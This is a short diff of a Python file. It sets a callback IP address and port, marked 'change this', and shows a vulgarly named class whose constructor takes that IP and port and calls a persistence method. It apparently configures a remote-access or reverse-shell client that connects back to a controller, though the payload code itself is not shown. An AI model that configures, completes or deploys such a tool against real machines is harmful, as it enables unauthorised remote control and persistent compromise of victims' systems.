@@ -8,8 +8,11 @@ import sys
 import shutil
 import requests
 
-IP = "" # change this
-PORT = 80 # change this (Integer Only)
+IP = "192.168.1.31" # change this
+PORT = 4445 # change this (Integer Only)
+
+
+
 class MotherFucker():
     def __init__(self, ip, port):
         self.persistence()
